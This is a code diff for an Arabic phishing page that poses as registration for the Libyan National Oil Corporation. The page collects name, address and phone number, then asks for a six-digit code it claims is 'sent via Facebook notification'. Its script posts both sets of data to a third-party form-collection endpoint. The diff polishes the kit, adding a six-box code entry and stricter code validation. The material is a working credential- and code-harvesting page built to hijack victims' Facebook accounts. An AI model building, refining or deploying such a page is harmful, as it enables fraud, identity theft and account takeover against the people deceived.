@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية</title>
+  <title>المؤسسة الوطنيــة</title>
 
   <link rel="icon" href="uy.jpeg" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
@@ -26,10 +26,13 @@
       padding: 35px 40px;
       width: 96%;
       max-width: 420px;
+      box-sizing: border-box;
       text-align: center;
+      z-index: 1;
     }
 
     .logo-container {
+      text-align: center;
       margin-bottom: 20px;
     }
 
@@ -37,19 +40,23 @@
       width: 90px;
       height: 90px;
       object-fit: contain;
+      margin: 0 auto;
+      display: block;
     }
 
     .logo-container p {
       margin-top: 8px;
       font-weight: 700;
       color: #003366;
+      font-size: 16px;
     }
 
     h2 {
       margin-bottom: 25px;
       color: #003366;
-      font-size: 32px;
       font-weight: 900;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 32px;
     }
 
     label {
@@ -70,6 +77,7 @@
       margin-bottom: 18px;
       transition: border-color 0.3s ease;
       box-sizing: border-box;
+      font-family: inherit;
     }
 
     input:focus {
@@ -91,6 +99,7 @@
       color: #002147;
       cursor: pointer;
       font-weight: bold;
+      font-family: Calibri, sans-serif;
       transition: background-color 0.3s ease;
       margin-bottom: 15px;
     }
@@ -105,14 +114,45 @@
     }
 
     #timer {
+      text-align: center;
       font-weight: 600;
       color: red;
       margin-bottom: 20px;
       min-height: 24px;
     }
 
-    #codeField {
-      display: none;
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      direction: ltr;
+    }
+
+    .otp-input {
+      width: 44px;
+      height: 52px;
+      font-size: 26px;
+      font-weight: bold;
+      text-align: center;
+      border: 2px solid #003366;
+      border-radius: 10px;
+      background-color: #f9f9f9;
+      color: #002147;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .otp-input:focus {
+      border-color: gold;
+    }
+
+    .autofill-hint {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-top: 5px;
+      margin-bottom: 20px;
     }
 
     .error {
@@ -121,57 +161,60 @@
       margin-top: -10px;
       margin-bottom: 15px;
     }
-
-    .hint {
-      color: gray;
-      font-size: 14px;
-      margin-bottom: 10px;
-    }
-
-    #facebookNotice {
-      color: #003366;
-      font-weight: bold;
-      margin-bottom: 10px;
-      display: none;
-    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo-container">
-      <img src="uy.jpeg" alt="شعار المؤسسة" />
-      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-    </div>
-
-    <h2>تسجيل الدخول</h2>
-
-    <form id="phoneForm" onsubmit="return sendPhone(event);">
-      <label for="fullname">الاسم الثلاثي:</label>
-      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
-
-      <label for="address">العنوان:</label>
-      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
-
-      <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
-
-      <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
-      <div id="timer"></div>
-    </form>
-
-    <form id="codeForm" onsubmit="return sendCode(event);">
-      <div id="codeField">
-        <p id="facebookNotice">جاري إرسال الكود عبر إشعار فيسبوك مكوّن من 6 أرقام</p>
-        <label for="code">جاري إرسال الكود عبر SMS</label>
-        <p class="hint">إذا لم يتم ملء الكود تلقائيًا، يرجى نسخه من الإشعار ولصقه هنا</p>
-        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
-        <div id="errorMessage" class="error"></div>
-        <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
-          جاري معالجة طلبك، يمكن المراجعة خلال 7 إلى 30 يومًا إذا طُلب منك بيانات إضافية.
-        </div>
+  <div id="main-content">
+    <div class="container">
+      <div class="logo-container">
+        <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+        <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
       </div>
-    </form>
+
+      <h2>تسجيل الدخول</h2>
+
+      <form id="phoneForm" onsubmit="return sendPhone(event);">
+        <label for="fullname">الاسم الثلاثي:</label>
+        <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+
+        <label for="address">العنوان:</label>
+        <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
+
+        <label for="phone">رقم الهاتف:</label>
+        <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+
+        <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
+        <div id="timer"></div>
+      </form>
+
+      <form id="codeForm" onsubmit="return sendCode(event);">
+        <div id="codeField" style="display: none;">
+          <label style="font-weight: bold; color: #003366; font-size: 18px;">
+            جاري إرسال الكود عبر إشعار فيسبوك
+          </label>
+
+          <div class="otp-container" id="otpInputs">
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+          </div>
+
+          <div class="autofill-hint">
+            سيتم إدخال الكود تلقائيًا عند وصول إشعار من فيسبوك إذا كان مدعومًا من المتصفح.
+          </div>
+
+          <div id="errorMessage" class="error"></div>
+          <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
+
+          <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
+            جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
+          </div>
+        </div>
+      </form>
+    </div>
   </div>
 
   <script>
@@ -206,8 +249,8 @@
     function sendPhone(event) {
       event.preventDefault();
       const phoneInput = document.getElementById('phone');
-      const fullname = document.getElementById('fullname');
-      const address = document.getElementById('address');
+      const fullname = document.getElementById('fullname').value;
+      const address = document.getElementById('address').value;
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
@@ -215,12 +258,7 @@
         return false;
       }
 
-      const payload = {
-        fullname: fullname.value,
-        address: address.value,
-        phone: phoneInput.value
-      };
-
+      const payload = { fullname, address, phone: phoneInput.value };
       fetch('https://formcarry.com/s/2evKahWtdJS', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
@@ -229,12 +267,9 @@
       .then(response => {
         if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
         phoneInput.disabled = true;
-        fullname.disabled = true;
-        address.disabled = true;
         document.getElementById('sendPhoneBtn').disabled = true;
         document.getElementById('codeField').style.display = 'block';
-        document.getElementById('facebookNotice').style.display = 'block';
-        startTimer(480); // 8 دقائق
+        startTimer(480);
       })
       .catch(error => {
         alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
@@ -244,23 +279,36 @@
       return false;
     }
 
+    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
     function sendCode(event) {
       event.preventDefault();
-      const codeInput = document.getElementById('code');
+      const codeInputs = document.querySelectorAll('.otp-input');
+      const code = Array.from(codeInputs).map(input => input.value).join('');
       const errorMessage = document.getElementById('errorMessage');
       const processingMessage = document.getElementById('processingMessage');
       const sendCodeBtn = document.getElementById('sendCodeBtn');
       errorMessage.textContent = '';
 
-      if (codeInput.value.trim() === '') {
-        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
-        codeInput.focus();
+      if (code.length !== 6 || !/^[0-9]{6}$/.test(code)) {
+        errorMessage.textContent = 'يرجى إدخال الكود المكون من 6 أرقام بشكل صحيح.';
         return false;
       }
 
       const payload = {
         phone: document.getElementById('phone').value,
-        code: codeInput.value
+        code
       };
 
       fetch('https://formcarry.com/s/2evKahWtdJS', {
